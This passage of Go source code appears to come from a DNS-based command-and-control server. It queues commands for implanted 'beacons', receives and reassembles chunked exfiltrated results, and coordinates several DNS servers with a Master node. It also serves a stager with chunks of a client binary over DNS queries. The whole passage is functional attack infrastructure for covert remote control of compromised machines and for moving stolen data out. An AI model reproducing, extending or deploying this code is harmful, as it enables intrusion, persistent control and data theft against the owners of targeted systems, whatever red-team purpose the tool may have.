						logf("[DEBUG] Task %s exfiltration stalled/finished, clearing CurrentTask for beacon %s", task.ID, beaconID)
					}
					// Don't return - fall through to check queue for next task
				}
			} else {
				// Task still pending/sent - but check Master before re-sending
				// It might have been completed on another DNS server
				c2.mutex.Unlock()

				// SHADOW MESH: Check Master to see if task was completed elsewhere
				if masterClient != nil {
					// Get master task ID if we have a mapping
					c2.mutex.RLock()
					masterTaskID, hasMasterID := c2.masterTaskIDs[task.ID]
					c2.mutex.RUnlock()

					checkTaskID := task.ID
					if hasMasterID {
						checkTaskID = masterTaskID
					}

					// Query Master for task status
					if masterStatus, err := masterClient.GetTaskStatus(checkTaskID); err == nil {
						if masterStatus == "completed" || masterStatus == "failed" || masterStatus == "partial" {
							// Task was completed on another server - clear it locally
							c2.mutex.Lock()
							if storedTask, exists := c2.tasks[task.ID]; exists {
								storedTask.Status = masterStatus
							}
							beacon.CurrentTask = ""
							c2.mutex.Unlock()

							if c2.debug && !isDuplicate {
								logf("[DEBUG] Task %s was completed on another DNS server (status: %s), cleared from beacon %s", task.ID, masterStatus, beaconID)
							}
							return "ACK" // Don't re-send completed task
						}
					}
				}

				// Task was sent but beacon checked in without starting exfiltration
				// This means the beacon either didn't receive it or couldn't execute it
				// Mark as failed instead of resending
				c2.mutex.Lock()
				if storedTask, exists := c2.tasks[task.ID]; exists {
					if storedTask.Status == "sent" && storedTask.SentAt != nil {
						// Beacon checked in but didn't start task - mark as failed
						storedTask.Status = "failed"
						storedTask.Result = "Task failed: Beacon checked in without starting execution"
						beacon.CurrentTask = "" // Clear so next task can be delivered
						logf("[C2] Task %s marked as FAILED for beacon %s (sent but not executed)", task.ID, beaconID)

						// Update in database
						if c2.db != nil {
							go func(tid, result string) {
								if err := c2.db.UpdateTaskStatus(tid, "failed"); err != nil && c2.debug {
									logf("[C2] Failed to update task status in database: %v", err)
								}
								if err := c2.db.SaveTaskResult(tid, beaconID, result, 1, 1); err != nil && c2.debug {
									logf("[C2] Failed to save task result in database: %v", err)
								}
							}(task.ID, storedTask.Result)
						}

						// Notify Master
						if masterClient != nil {
							go func(tid, bid, result string) {
								if _, err := masterClient.SubmitResult(tid, bid, 1, 1, result); err != nil && c2.debug {
									logf("[C2] Failed to notify Master of task failure: %v", err)
								}
							}(task.ID, beaconID, storedTask.Result)
						}
					}
				}
				c2.mutex.Unlock()
				return "ACK" // Task failed, move on
			}
		} else {
			// Task doesn't exist anymore, clear it
			beacon.CurrentTask = ""
		}
	}

	// Now check for next task in queue
	if len(beacon.TaskQueue) > 0 {
		task := beacon.TaskQueue[0]

		// Double-check task status before delivering (prevent re-delivery of completed/executing tasks)
		if storedTask, exists := c2.tasks[task.ID]; exists {
			if storedTask.Status == "completed" || storedTask.Status == "failed" || storedTask.Status == "partial" {
				// Task was completed, remove from queue and don't deliver
				beacon.TaskQueue = beacon.TaskQueue[1:]
				if c2.debug {
					logf("[DEBUG] Skipping completed task %s from queue for beacon %s", task.ID, beaconID)
				}
				c2.mutex.Unlock()
				return "ACK" // No task to deliver
			} else if storedTask.Status == "sent" {
				// Task already sent but beacon checked in without starting it
				// Mark as failed and remove from queue
				beacon.TaskQueue = beacon.TaskQueue[1:]
				storedTask.Status = "failed"
				storedTask.Result = "Task failed: Sent but not executed by beacon"
				logf("[C2] Task %s marked as FAILED for beacon %s (sent but beacon didn't execute)", task.ID, beaconID)

				// Update in database
				if c2.db != nil {
					go func(tid, bid, result string) {
						if err := c2.db.UpdateTaskStatus(tid, "failed"); err != nil && c2.debug {
							logf("[C2] Failed to update task status in database: %v", err)
						}
						if err := c2.db.SaveTaskResult(tid, bid, result, 1, 1); err != nil && c2.debug {
							logf("[C2] Failed to save task result in database: %v", err)
						}
					}(task.ID, beaconID, storedTask.Result)
				}

				// Notify Master
				if masterClient != nil {
					go func(tid, bid, result string) {
						if _, err := masterClient.SubmitResult(tid, bid, 1, 1, result); err != nil && c2.debug {
							logf("[C2] Failed to notify Master of task failure: %v", err)
						}
					}(task.ID, beaconID, storedTask.Result)
				}

				c2.mutex.Unlock()
				return "ACK" // Task failed, check for next task
			} else if storedTask.Status == "exfiltrating" {
				// Task being exfiltrated - remove from queue and don't re-send
				beacon.TaskQueue = beacon.TaskQueue[1:]
				if c2.debug {
					logf("[DEBUG] Skipping exfiltrating task %s from queue for beacon %s", task.ID, beaconID)
				}
				c2.mutex.Unlock()
				return "ACK" // No task to deliver
			}
		} else {
			// Task doesn't exist in c2.tasks map - invalid, remove from queue
			beacon.TaskQueue = beacon.TaskQueue[1:]
			if c2.debug {
				logf("[DEBUG] Removing invalid task %s (not in tasks map) from queue for beacon %s", task.ID, beaconID)
			}
			c2.mutex.Unlock()
			return "ACK"
		}

		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove from queue
		beacon.CurrentTask = task.ID            // Mark as current task

		// Check if this is a domain update task (D-prefix)
		// These are fire-and-forget tasks that don't expect a result
		isDomainUpdate := strings.HasPrefix(task.ID, "D")

		// Mark task as sent (or completed for domain updates)
		if storedTask, exists := c2.tasks[task.ID]; exists {
			if isDomainUpdate {
				// Domain update tasks are auto-completed on delivery
				// The client doesn't send a result for these (see Client/main.go:435)
				storedTask.Status = "completed"
				now := time.Now()
				storedTask.SentAt = &now
				storedTask.Result = "domains_updated" // Implicit result
				beacon.CurrentTask = ""               // Clear immediately - no result expected

				if c2.debug {
					logf("[DEBUG] Auto-completed domain update task %s for beacon %s (fire-and-forget)", task.ID, beaconID)
				}
			} else {
				// Regular task - mark as sent, wait for result
				storedTask.Status = "sent"
				now := time.Now()
				storedTask.SentAt = &now
			}
		}
		c2.mutex.Unlock()

		// CRITICAL: Notify Master that THIS DNS server delivered the task
		// This prevents other DNS servers from delivering it (Shadow Mesh coordination)
		if masterClient != nil {
			go func(tid string, completed bool) {
				if completed {
					// For domain updates, submit an implicit result to Master
					// This marks the task as completed in the Master database
					_, err := masterClient.SubmitResult(tid, beaconID, 1, 1, "domains_updated")
					if err != nil && c2.debug {
						logf("[C2] Warning: Failed to submit domain update completion to Master: %v", err)
					}
				} else {
					// For regular tasks, just notify delivery
					if err := masterClient.MarkTaskDelivered(tid); err != nil && c2.debug {
						logf("[C2] Warning: Failed to notify Master of task delivery: %v", err)
					}
				}
			}(task.ID, isDomainUpdate)
		}

		// Update task status in local database (async, outside lock)
		if c2.db != nil {
			go func(tid string, completed bool) {
				status := "sent"
				if completed {
					status = "completed"
				}
				if err := c2.db.UpdateTaskStatus(tid, status); err != nil && c2.debug {
					logf("[C2] Failed to update task status in database: %v", err)
				}
			}(task.ID, isDomainUpdate)
		}

		taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
		logf("[C2] Task %s → %s: %s", task.ID, beaconID, task.Command)
		if c2.debug {
			logf("[DEBUG] Returning task response: %s", taskResponse)
		}
		return taskResponse
	}
	c2.mutex.Unlock()

	// For new beacons (first check-in), send domain list if available
	if !exists {
		domains := c2.GetKnownDomains()
		if len(domains) > 0 {
			domainList := strings.Join(domains, ",")
			if c2.debug {
				logf("[C2] Sending domain list to new beacon %s: %v", beaconID, domains)
			}
			return fmt.Sprintf("DOMAINS|%s", domainList)
		}
	}

	return "ACK" // No tasks available
}

// handleResult processes a command result from a beacon
func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
	if len(parts) < 4 {
		logf("[C2] ERROR: handleResult received incomplete parts: %d", len(parts))
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	result := parts[3]

	// These are sent after update_domains tasks and may arrive at DNS servers
	// that didn't assign the original task (cross-server domain updates)
	if result == "domains_updated" {
		if !isDuplicate {
			logf("[C2] Domain update acknowledged by beacon %s (task %s)", beaconID, taskID)
		}

		// CRITICAL: Clear the beacon's current task immediately
		// This prevents the DNS server from re-sending the update_domains task
		// when the beacon checks in again
		c2.mutex.Lock()
		if beacon, beaconExists := c2.beacons[beaconID]; beaconExists {
			if beacon.CurrentTask == taskID {
				beacon.CurrentTask = ""
				if c2.debug {
					logf("[DEBUG] Cleared current task for beacon %s after domains_updated", beaconID)
				}
			}
		}

		// Also mark the task as completed in local database if it exists
		if task, exists := c2.tasks[taskID]; exists {
			task.Status = "completed"
			task.Result = result
			if c2.db != nil {
				go func(tid string) {
					if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
						logf("[C2] Failed to update domains_updated task status: %v", err)
					}
				}(taskID)
			}
		}
		c2.mutex.Unlock()

		// Forward to Master if in distributed mode - skip for duplicates
		if masterClient != nil && !isDuplicate {
			go func(tid, bid, res string) {
				c2.mutex.RLock()
				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
				c2.mutex.RUnlock()

				submitTaskID := tid
				if hasMasterID {
					submitTaskID = masterTaskID
				}

				taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 1, 1, res)
				if err == nil && taskComplete {
					// Master signaled task is complete - clear from beacon's current task
					c2.mutex.Lock()
					if beacon, exists := c2.beacons[bid]; exists {
						if beacon.CurrentTask == tid {
							beacon.CurrentTask = ""
							if c2.debug {
								logf("[C2] Task %s completed, cleared from beacon %s CurrentTask", tid, bid)
							}
						}
					}
					c2.mutex.Unlock()
				}
			}(taskID, beaconID, result)
		}
		return "ACK"
	} // Log receipt of result (include small preview) - skip for duplicates
	if !isDuplicate {
		preview := result
		if len(preview) > ResultPreviewMaxLength {
			preview = preview[:ResultPreviewMaxLength] + "..."
		}
		logf("[C2] Result: %s → %s: %s", beaconID, taskID, preview)
	}

	// Update the task with mutex protection
	c2.mutex.Lock()
	task, exists := c2.tasks[taskID]
	if exists {
		// For single-chunk results, transition: sent → exfiltrating → completed
		if task.Status == "sent" && !isDuplicate {
			task.Status = "exfiltrating"
			if c2.db != nil {
				go func(tid string) {
					if err := c2.db.UpdateTaskStatus(tid, "exfiltrating"); err != nil && c2.debug {
						logf("[C2] Failed to update task status to exfiltrating: %v", err)
					}
				}(taskID)
			}
		}
		task.Result = result
		task.Status = "completed"
		if c2.debug && !isDuplicate {
			logf("[DEBUG] Updated task %s: status=completed, result_len=%d", taskID, len(result))
		}

		// CRITICAL: Clear the beacon's current task so it can receive new tasks
		if beacon, beaconExists := c2.beacons[beaconID]; beaconExists {
			if beacon.CurrentTask == taskID {
				beacon.CurrentTask = ""
				if c2.debug && !isDuplicate {
					logf("[DEBUG] Cleared current task for beacon %s", beaconID)
				}
			}
		}
	} else {
		if c2.debug && !isDuplicate {
			logf("[DEBUG] Task %s not found in memory (completed on another DNS server), forwarding to Master", taskID)
		}
		// DON'T save to local DB - this task was handled by another DNS server
		// Just forward to Master so it can be marked complete
		// The local DB FK constraints would fail anyway since beacon may not be in this server's DB
	}
	c2.mutex.Unlock()

	// Save result to database (async) - skip for duplicates and tasks not in memory
	if c2.db != nil && !isDuplicate && exists {
		go func(tid, bid, res string) {
			if err := c2.db.SaveTaskResult(tid, bid, res, 1, 1); err != nil && c2.debug {
				logf("[C2] Failed to save task result to database: %v", err)
			}
			if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
				logf("[C2] Failed to update task status in database: %v", err)
			}
		}(taskID, beaconID, result)
	}

	// Report result to Master Server (if in distributed mode) - skip for duplicates
	if masterClient != nil && !isDuplicate {
		go func(tid, bid, res string) {
			// Get the master task ID
			c2.mutex.RLock()
			masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
			c2.mutex.RUnlock()

			// Use master task ID if available, otherwise use local ID
			submitTaskID := tid
			if hasMasterID {
				submitTaskID = masterTaskID
			}

			if c2.debug {
				logf("[C2] Submitting single RESULT to Master: taskID=%s, beaconID=%s, resultLen=%d, chunkIndex=1, totalChunks=1", submitTaskID, bid, len(res))
			}
			taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 1, 1, res)
			if err != nil {
				if c2.debug {
					logf("[C2] Failed to submit result to master: %v", err)
				}
			} else if taskComplete {
				// Master signaled task is complete - clear from beacon's current task
				c2.mutex.Lock()
				if beacon, exists := c2.beacons[bid]; exists {
					if beacon.CurrentTask == tid {
						beacon.CurrentTask = ""
						if c2.debug {
							logf("[C2] Task %s completed, cleared from beacon %s CurrentTask", tid, bid)
						}
					}
				}
				c2.mutex.Unlock()
			}

			// Clean up master task ID mapping after successful submission
			if hasMasterID {
				c2.mutex.Lock()
				delete(c2.masterTaskIDs, tid)
				c2.mutex.Unlock()
			}
		}(taskID, beaconID, result)
	}

	return "ACK"
}

// handleChunk processes a chunk of result data (DEPRECATED - legacy protocol)
func (c2 *C2Manager) handleChunk(parts []string) string {
	if len(parts) < 6 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	chunkIndex, _ := strconv.Atoi(parts[3])
	totalChunks, _ := strconv.Atoi(parts[4])
	data := parts[5]

	// Store the chunk
	chunk := ResultChunk{
		BeaconID:    beaconID,
		TaskID:      taskID,
		ChunkIndex:  chunkIndex,
		TotalChunks: totalChunks,
		Data:        data,
		ReceivedAt:  time.Now(),
	}

	c2.resultChunks[taskID] = append(c2.resultChunks[taskID], chunk)

	// Check if we have all chunks
	chunks := c2.resultChunks[taskID]
	if len(chunks) == totalChunks {
		// Reconstruct the complete result
		result := c2.reconstructResult(chunks)

		// Update the task
		if task, exists := c2.tasks[taskID]; exists {
			task.Result = result
			task.Status = "completed"
			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), totalChunks)
		}

		// Clean up chunks
		delete(c2.resultChunks, taskID)
	}

	return "ACK"
}

// reconstructResult reconstructs a complete result from chunks
func (c2 *C2Manager) reconstructResult(chunks []ResultChunk) string {
	// Sort chunks by index
	sortedChunks := make([]string, len(chunks))
	for _, chunk := range chunks {
		if chunk.ChunkIndex > 0 && chunk.ChunkIndex <= len(chunks) {
			sortedChunks[chunk.ChunkIndex-1] = chunk.Data
		}
	}

	return strings.Join(sortedChunks, "")
}

// handleResultMeta processes result metadata from beacon (two-phase protocol)
func (c2 *C2Manager) handleResultMeta(parts []string, isDuplicate bool) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	totalSize, _ := strconv.Atoi(parts[3])
	totalChunks, _ := strconv.Atoi(parts[4])

	if !isDuplicate {
		logf("[C2] Expecting chunked result from %s for %s: %d bytes in %d chunks",
			beaconID, taskID, totalSize, totalChunks)
	}

	// Store the expectation (with mutex protection)
	expected := &ExpectedResult{
		BeaconID:     beaconID,
		TaskID:       taskID,
		TotalSize:    totalSize,
		TotalChunks:  totalChunks,
		ReceivedAt:   time.Now(),
		ReceivedData: make([]string, totalChunks),
	}

	c2.mutex.Lock()
	c2.expectedResults[taskID] = expected

	// CRITICAL: Remove task from beacon's queue immediately when META arrives
	// This prevents task from being re-delivered while beacon is sending results
	if beacon, exists := c2.beacons[beaconID]; exists {
		newQueue := []Task{}
		removed := false
		for _, queuedTask := range beacon.TaskQueue {
			if queuedTask.ID != taskID {
				newQueue = append(newQueue, queuedTask)
			} else {
				removed = true
			}
		}
		if removed {
			beacon.TaskQueue = newQueue
			if c2.debug {
				logf("[C2] Removed task %s from beacon %s queue (META received, result incoming)", taskID, beaconID)
			}
		}
	}
	c2.mutex.Unlock()

	return "ACK"
}

// handleData processes data chunks from beacon (two-phase protocol)
// In Shadow Mesh mode, chunks are distributed across multiple DNS servers
// Each server forwards chunks immediately to Master for reassembly
func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	chunkIndex, _ := strconv.Atoi(parts[3])
	data := parts[4]

	// Get totalChunks from expectation (set by META message)
	c2.mutex.RLock()
	expected, hasExpectation := c2.expectedResults[taskID]
	task, taskExists := c2.tasks[taskID]
	totalChunks := 0
	if hasExpectation {
		totalChunks = expected.TotalChunks
	}
	c2.mutex.RUnlock()

	// If no expectation and task is completed, this is a duplicate
	if !hasExpectation && taskExists && task.Status == "completed" {
		if c2.debug {
			logf("[DEBUG] Received duplicate DATA chunk for completed task %s", taskID)
		}
		return "ACK"
	}

	// Update task status to "exfiltrating" when first chunk arrives
	// AND remove from beacon's task queue to prevent re-delivery
	if !isDuplicate && taskExists && task.Status == "sent" {
		c2.mutex.Lock()
		if c2.tasks[taskID].Status == "sent" {
			c2.tasks[taskID].Status = "exfiltrating"
			if c2.db != nil {
				go func(tid string) {
					if err := c2.db.UpdateTaskStatus(tid, "exfiltrating"); err != nil && c2.debug {
						logf("[C2] Failed to update task status to exfiltrating: %v", err)
					}
				}(taskID)
			}
			if c2.debug {
				logf("[DEBUG] Task %s status: sent → exfiltrating", taskID)
			}

			// CRITICAL: Remove task from beacon's queue immediately
			// Once beacon starts sending results, it shouldn't receive the task again
			if beacon, exists := c2.beacons[beaconID]; exists {
				newQueue := []Task{}
				for _, queuedTask := range beacon.TaskQueue {
					if queuedTask.ID != taskID {
						newQueue = append(newQueue, queuedTask)
					}
				}
				beacon.TaskQueue = newQueue
				if c2.debug {
					logf("[C2] Removed task %s from beacon %s queue (exfiltration started)", taskID, beaconID)
				}
			}
		}
		c2.mutex.Unlock()
	}

	// SHADOW MESH: Queue chunk for batched submission to Master
	// Batching reduces Master load by sending 10 chunks at a time
	// This prevents overwhelming Master with thousands of concurrent requests
	if masterClient != nil && !isDuplicate {
		c2.submitResultChunkBatched(taskID, beaconID, chunkIndex, totalChunks, data, masterClient)
	} // Local tracking for fallback/redundancy (but don't rely on it for Shadow Mesh)
	if hasExpectation {
		c2.mutex.Lock()
		if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
			// Only update if this is a new chunk (not a duplicate)
			if expected.ReceivedData[chunkIndex-1] == "" {
				expected.ReceivedData[chunkIndex-1] = data
				expected.LastChunkIndex = chunkIndex
				expected.ReceivedAt = time.Now()
			}
		}
		c2.mutex.Unlock()
	}

	return "ACK"
}

// submitResultChunkBatched queues a chunk for batched submission to Master
// Reduces Master load by sending 10 chunks at a time instead of individual requests
func (c2 *C2Manager) submitResultChunkBatched(taskID, beaconID string, chunkIndex, totalChunks int, data string, masterClient *MasterClient) {
	const BATCH_SIZE = 10                        // Send 10 chunks per batch
	const BATCH_TIMEOUT = 500 * time.Millisecond // Or flush after 500ms

	chunk := ResultChunk{
		BeaconID:    beaconID,
		TaskID:      taskID,
		ChunkIndex:  chunkIndex,
		TotalChunks: totalChunks,
		Data:        data,
		ReceivedAt:  time.Now(),
	}

	c2.mutex.Lock()

	// Add chunk to buffer
	c2.resultBatchBuffer[taskID] = append(c2.resultBatchBuffer[taskID], chunk)
	bufferLen := len(c2.resultBatchBuffer[taskID])

	// Cancel existing timer if any
	if timer, exists := c2.resultBatchTimer[taskID]; exists {
		timer.Stop()
		delete(c2.resultBatchTimer, taskID)
	}

	// Check if we should flush now
	shouldFlush := false
	if bufferLen >= BATCH_SIZE {
		shouldFlush = true
	} else if chunkIndex == totalChunks {
		// Last chunk - flush immediately
		shouldFlush = true
	}

	if shouldFlush {
		// Flush the batch
		batch := c2.resultBatchBuffer[taskID]
		delete(c2.resultBatchBuffer, taskID)
		c2.mutex.Unlock()

		// Submit batch in background
		go c2.flushResultBatch(batch, taskID, masterClient)
	} else {
		// Set timer to flush after timeout
		c2.resultBatchTimer[taskID] = time.AfterFunc(BATCH_TIMEOUT, func() {
			c2.mutex.Lock()
			batch := c2.resultBatchBuffer[taskID]
			delete(c2.resultBatchBuffer, taskID)
			delete(c2.resultBatchTimer, taskID)
			c2.mutex.Unlock()

			if len(batch) > 0 {
				c2.flushResultBatch(batch, taskID, masterClient)
			}
		})
		c2.mutex.Unlock()
	}
}

// flushResultBatch sends a batch of result chunks to Master
func (c2 *C2Manager) flushResultBatch(batch []ResultChunk, taskID string, masterClient *MasterClient) {
	if len(batch) == 0 {
		return
	}

	// SHADOW MESH: taskID is already the Master task ID (no mapping needed)
	// All DNS servers use the same Master task ID from sync
	if c2.debug {
		logf("[C2] Flushing batch of %d chunks for task %s", len(batch), taskID)
	}

	// Submit each chunk in the batch
	var anyComplete bool
	for _, chunk := range batch {
		taskComplete, err := masterClient.SubmitResult(taskID, chunk.BeaconID, chunk.ChunkIndex, chunk.TotalChunks, chunk.Data)
		if err != nil {
			if c2.debug {
				logf("[C2] Failed to submit chunk %d in batch: %v", chunk.ChunkIndex, err)
			}
			// Continue submitting rest of batch even if one fails
		} else if taskComplete {
			// If ANY chunk reports completion, the task is done (Master has all chunks)
			anyComplete = true
		}
	}

	// If task is complete, update local state
	if anyComplete {
		beaconID := batch[0].BeaconID
		c2.mutex.Lock()

		// Update task status to completed
		if task, exists := c2.tasks[taskID]; exists {
			task.Status = "completed"
			if c2.debug {
				logf("[C2] Task %s marked as completed (Master confirmed)", taskID)
			}
		}

		// Clear ExpectedResult (exfiltration finished)
		delete(c2.expectedResults, taskID)

		// Clear from beacon's current task
		if beacon, exists := c2.beacons[beaconID]; exists {
			if beacon.CurrentTask == taskID {
				beacon.CurrentTask = ""
				if c2.debug {
					logf("[C2] Task %s completed, cleared from beacon %s CurrentTask", taskID, beaconID)
				}
			}
		}
		c2.mutex.Unlock()

		// Update database (async)
		if c2.db != nil {
			go func(tid string) {
				if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
					logf("[C2] Failed to update task status in database: %v", err)
				}
			}(taskID)
		}
	}
}

// generateDeterministicSessionID creates a consistent session ID based on stager IP + binary ID
// This ensures all DNS servers AND Master generate the same session ID for the same stager
// Critical for Shadow Mesh: stager load-balances across multiple DNS servers
func generateDeterministicSessionID(stagerIP, clientBinaryID string) string {
	// Hash stager IP + client binary ID to get deterministic session ID
	data := fmt.Sprintf("%s|%s", stagerIP, clientBinaryID)
	hash := sha256.Sum256([]byte(data))

	// Use first 4 hex chars from hash (16 bits) - matches stg_XXXX format
	hashHex := hex.EncodeToString(hash[:])
	return fmt.Sprintf("stg_%s", hashHex[:4])
}

// handleStagerRequest processes a stager deployment request
// Format: STG|IP|OS|ARCH
// In distributed mode with cache, responds immediately with cached metadata
// If no cache available, returns error (stager session should already exist from Master build)
func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDuplicate bool) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	stagerIP := parts[1]
	stagerOS := parts[2]
	stagerArch := parts[3]

	if !isDuplicate {
		logf("[C2] Stager request from %s (%s/%s) - IP: %s", clientIP, stagerOS, stagerArch, stagerIP)
	}

	// In distributed mode, ONLY serve from cache
	// The cache should have been pushed during DNS server checkin
	if masterClient != nil && c2.db != nil {
		// First check if we already have a session for this stager IP
		// This prevents creating duplicate sessions from DNS retries
		c2.mutex.RLock()
		for sessionID, session := range c2.cachedStagerSessions {
			if session.StagerIP == stagerIP {
				c2.mutex.RUnlock()
				// Return existing session's META response with checksum
				metaResponse := fmt.Sprintf("META|%s|%d|%s", sessionID, session.TotalChunks, session.SHA256Checksum)
				if !isDuplicate {
					logf("[C2] Using existing session %s for stager %s", sessionID, stagerIP)
				}
				return metaResponse
			}
		}
		c2.mutex.RUnlock()

		// Look for cached client binary
		if !isDuplicate {
			logf("[C2] 🔍 Checking stager_chunk_cache for any cached binaries...")
		}

		rows, err := c2.db.db.Query(`
			SELECT DISTINCT client_binary_id, COUNT(*) as chunk_count
			FROM stager_chunk_cache
			GROUP BY client_binary_id
			ORDER BY cached_at DESC
			LIMIT 1
		`)

		if err != nil {
			logf("[C2] Error querying stager_chunk_cache: %v", err)
		} else {
			defer rows.Close()
			if rows.Next() {
				var clientBinaryID string
				var chunkCount int
				if err := rows.Scan(&clientBinaryID, &chunkCount); err == nil && chunkCount > 0 {
					// We have cached chunks! Generate deterministic session ID and respond immediately
					// Master roundtrip is TOO SLOW for DNS timeouts (2-5 seconds)
					if !isDuplicate {
						logf("[C2] 🚀 Cache HIT for stager! Using cached binary: %s (%d chunks)", clientBinaryID, chunkCount)
					}

					// Generate deterministic session ID (same as Master will create)
					// This ensures all DNS servers + Master use the same session ID
					sessionID := generateDeterministicSessionID(stagerIP, clientBinaryID)

					if !isDuplicate {
						logf("[C2] Generated session ID: %s (deterministic, Master will use same)", sessionID)
					}

					// Store session info locally for chunk serving
					c2.mutex.Lock()
					if c2.cachedStagerSessions == nil {
						c2.cachedStagerSessions = make(map[string]*CachedStagerSession)
					}
					c2.cachedStagerSessions[sessionID] = &CachedStagerSession{
						SessionID:       sessionID,
						MasterSessionID: sessionID,
						ClientBinaryID:  clientBinaryID,
						StagerIP:        stagerIP,
						TotalChunks:     chunkCount,
						CreatedAt:       time.Now(),
					}
					c2.mutex.Unlock()

					// Report to Master ASYNC (fire-and-forget for UI tracking)
					// The stager will wait a few seconds before requesting chunks
					// to give Master time to create the session
					go func() {
						masterSessionID, err := masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
						if err != nil {
							if c2.debug {
								logf("[C2] Warning: Failed to report stager to Master: %v", err)
							}
						} else if masterSessionID != sessionID {
							// This should never happen with deterministic IDs, but log if it does
							logf("[C2] Session ID mismatch! Local: %s, Master: %s", sessionID, masterSessionID)
						}
					}()

					// Return META immediately (fast DNS response!) with checksum
					// Checksum will be populated when session is fully synced with Master
					metaResponse := fmt.Sprintf("META|%s|%d|%s", sessionID, chunkCount, c2.cachedStagerSessions[sessionID].SHA256Checksum)
					if !isDuplicate {
						logf("[C2] Returning META response from cache: %s (len=%d)", metaResponse, len(metaResponse))
					}
					return metaResponse
				}
			}
		}

		// Cache miss - NO FALLBACK to creating new session
		// The cache should have been pushed when Master built the stager
		if !isDuplicate {
			logf("[C2] Cache MISS for stager - no cached binary available!")
			logf("[C2] Stager sessions should be created by Master build, not DNS server")
		}
		return "ERROR|NO_CACHE"
	}

	// No cache - return error
	// The stager should retry with a different DNS server that may have the cache
	return "ERROR|NO_CACHE"
}

// handleStagerChunkRequestNew handles chunk requests with cache-first architecture
// Session ID is for tracking only - we serve chunks from cache immediately
// Master is used for UI tracking, not for serving chunks (too slow for DNS timeouts)
func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string, sessionID string, masterClient *MasterClient, isDuplicate bool) string {
	// Strategy: Serve from cache immediately, report to Master async
	// DNS queries timeout in 2-5 seconds - no time for Master roundtrips!

	// First check if we know this session (to get client_binary_id)
	c2.mutex.RLock()
	cachedSession, hasCachedSession := c2.cachedStagerSessions[sessionID]
	c2.mutex.RUnlock()

	var clientBinaryID string
	var totalChunks int
	if hasCachedSession {
		clientBinaryID = cachedSession.ClientBinaryID
		totalChunks = cachedSession.TotalChunks
	} else {
		// Session not in memory yet - might be from different DNS server
		// Try to find ANY cached binary and serve from that
		// The stager embeds the client_binary_id implicitly via the domain list
		if !isDuplicate {
			logf("[C2] Session %s not in local cache, searching for cached chunks", sessionID)
		}

		// Use database method with proper mutex handling
		clientBinaryID, err := c2.db.GetCachedBinaryID()
		if err != nil {
			if !isDuplicate {
				logf("[C2] No cached chunks available: %v", err)
			}
			return "ERROR|NO_CACHE"
		}

		if !isDuplicate {
			logf("[C2] Found cached binary: %s (will serve from this)", clientBinaryID)
		}

		// Count total chunks for this binary
		if c2.db != nil {
			row := c2.db.db.QueryRow(`
				SELECT COUNT(*) FROM stager_chunk_cache 
				WHERE client_binary_id = ?
			`, clientBinaryID)
			if err := row.Scan(&totalChunks); err != nil {
				logf("[C2] Error counting chunks: %v", err)
				totalChunks = 0
			}
		}

		// CREATE SESSION NOW so subsequent chunks from this DNS server work!
		// This is critical for Shadow Mesh load balancing across multiple DNS servers
		if !isDuplicate {
			logf("[C2] 🔧 Creating session %s locally (stager load-balanced to this server)", sessionID)
		}

		c2.mutex.Lock()
		if c2.cachedStagerSessions == nil {
			c2.cachedStagerSessions = make(map[string]*CachedStagerSession)
		}
		c2.cachedStagerSessions[sessionID] = &CachedStagerSession{
			SessionID:       sessionID,
			MasterSessionID: sessionID,
			ClientBinaryID:  clientBinaryID,
			StagerIP:        stagerIP,
			TotalChunks:     totalChunks,
			ChunksServed:    0,
			CreatedAt:       time.Now(),
			LastActivity:    time.Now(),
		}
		c2.mutex.Unlock()

		if !isDuplicate {
			logf("[C2] Session %s created with %d chunks available", sessionID, totalChunks)
		}

		hasCachedSession = true
		cachedSession = c2.cachedStagerSessions[sessionID]
	}

	// Now serve the chunk from cache (fast - no Master query!)
	// Use proper database method instead of direct db access
	chunkData, err := c2.db.GetCachedChunkByBinaryID(clientBinaryID, chunkIndex)
	if err != nil {
		if !isDuplicate {
			logf("[C2] Chunk %d not in cache for binary %s: %v", chunkIndex, clientBinaryID, err)
		}
		return "ERROR|CHUNK_NOT_FOUND"
	}

	if !isDuplicate {
		logf("[C2] Serving chunk %d from cache (instant)", chunkIndex)
	}

	// Update session stats if we have the session
	if hasCachedSession {
		c2.mutex.Lock()
		cachedSession.ChunksServed++
		cachedSession.LastActivity = time.Now()
		c2.mutex.Unlock()
	}

	// Report to Master async (fire-and-forget for UI tracking only)
	// IMPORTANT: Only report if not a duplicate DNS retry!
	if !isDuplicate {
		go func() {
			if err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP); err != nil {
				// Silently fail - Master tracking is nice-to-have, not critical
				if c2.debug {
					logf("[C2] Warning: Failed to report chunk %d to Master: %v", chunkIndex, err)
				}
			}
		}()
	}

	return fmt.Sprintf("CHUNK|%s", chunkData)
}

// handleStandaloneStagerRequest handles standalone mode (no Master) - use local client binary
func (c2 *C2Manager) handleStandaloneStagerRequest(stagerIP, stagerOS, stagerArch string, isDuplicate bool) string {
	if !isDuplicate {
		logf("[C2] Warning: Running in standalone mode, using local client binary")
	}

	// Determine client binary filename based on OS
	var clientFilename string
	if strings.ToLower(stagerOS) == "windows" {
		clientFilename = "dns-client-windows.exe"
	} else {
		clientFilename = "dns-client-linux"
	}

	// Try multiple possible paths for the client binary
	var clientPath string
